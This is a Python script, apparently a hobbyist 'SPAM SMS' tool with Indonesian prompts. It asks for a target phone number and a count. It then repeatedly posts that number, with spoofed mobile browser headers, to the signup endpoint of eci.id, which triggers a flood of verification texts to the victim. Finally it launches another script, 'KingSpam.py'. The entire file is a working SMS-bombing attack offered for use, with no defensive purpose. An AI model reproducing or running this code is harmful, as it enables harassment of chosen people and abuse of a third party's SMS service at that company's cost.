# mengetik

#import
import os,sys,time
from time import sleep

# mengetik
def mengetik(c):
       for e in c + "\n":
          sys.stdout.write(e)
          sys.stdout.flush()
          time.sleep(0.03)

# program
os.system( 'clear' )
print("")
mengetik("    ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎")
mengetik("    ∎                                    ∎")
mengetik("    ∎         Author  : Rizqi Gans       ∎")
mengetik("    ∎         YouTube : Riskimbmbg       ∎")
mengetik("∎∎∎∎∎         Facebook: Riski mbmbg      ∎∎∎∎∎")
mengetik("∎   ∎         GitHub  : Riskimbmbg       ∎   ∎")
mengetik("∎   ∎                                    ∎   ∎")
mengetik("∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
time.sleep(1)

# animasi loading
mengetik("Loading [5%]")
mengetik("Loading [25%]")
mengetik("Loading [50%]")
mengetik("Loading [75%]")
mengetik("Loading [97%]")
mengetik("Loading [99%]")
mengetik("Loading [100%]")
time.sleep(3)
print("Login [✓]")

import time, requests,json,os

os.system("clear")

print("    ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎")
print("    ∎                                    ∎")
print("    ∎         Author  : Rizqi Gans       ∎")
print("    ∎         YouTube : Riskimbmbg       ∎")
print("∎∎∎∎∎         Facebook: Riski Mbmbg      ∎∎∎∎∎")
print("∎   ∎         GitHub  : Riskimbmbg       ∎   ∎")
print("∎   ∎                                    ∎   ∎")
print("∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎   ∎∎∎∎∎∎∎∎∎∎∎∎∎> SPAM SMS <∎∎∎∎∎∎∎∎∎∎∎∎∎   ∎")
time.sleep(1.2)
print("∎   ∎ \                                / ∎   ∎")
time.sleep(1.2)
print("∎∎∎∎∎        Nomer Target 8xxxxxxx       ∎∎∎∎∎")
time.sleep(1.2)
print("    ∎        Usahakan Spam Mentok 5      ∎")
time.sleep(1.2)
print("    ∎ /                                \ ∎")
time.sleep(1.2)
print("∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎> LOADING..<∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
time.sleep(1.2)
print("∎               ∎            ∎               ∎")
time.sleep(1.2)
print("∎               ∎∎∎∎∎∎∎∎∎∎∎∎∎∎               ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎                                            ∎")
time.sleep(1.2)
print("∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎∎")
time.sleep(1.2)
print("∎")
nomer = input("∎∎∎ Nomer Target ∎∎∎ : ")
time.sleep(2)
print("∎ Mendeteksi Nomer...")
time.sleep(3)
print("∎ Nomer Aktif [✓]")
time.sleep(1.2)
print("∎")
time.sleep(1.2)
print("∎")
time.sleep(1.2)
jumlah = int(input("∎∎∎ Jumlah Spam ∎∎∎ : "))
time.sleep(3)
print("∎")
time.sleep(1.5)
print("∎")
time.sleep(1.5)
print("∎")
time.sleep(1.5)
headers = {
"Host" : "eci.id",
"Connection" : "keep-alive",
"Content-Length" : "27",
"Accept" : "application/json, text/plain, */*",
"Origin" : "https://eci.id",
"User-Agent" : "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36",
"Content-Type" : "application/json",
"Referer" : "https://eci.id/register",
"Accept-Encoding" : "gzip, deflate, br",
"Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

data = json.dumps({"identity":"0"+nomer})
for i in range(jumlah):
	pos = requests.post("https://eci.id/api/signup",headers=headers,data=data).text

if "success" in pos:
    print("∎")
    time.sleep(1.2)
    print("∎∎∎ Cek Hp Target ∎∎∎ ",)

else:
    print("∎")
    time.sleep(1.2)
    print("∎∎∎ Maaf Gagal ∎∎∎ ",)
    time.sleep(1)
os.system("clear")
os.system("python KingSpam.py")

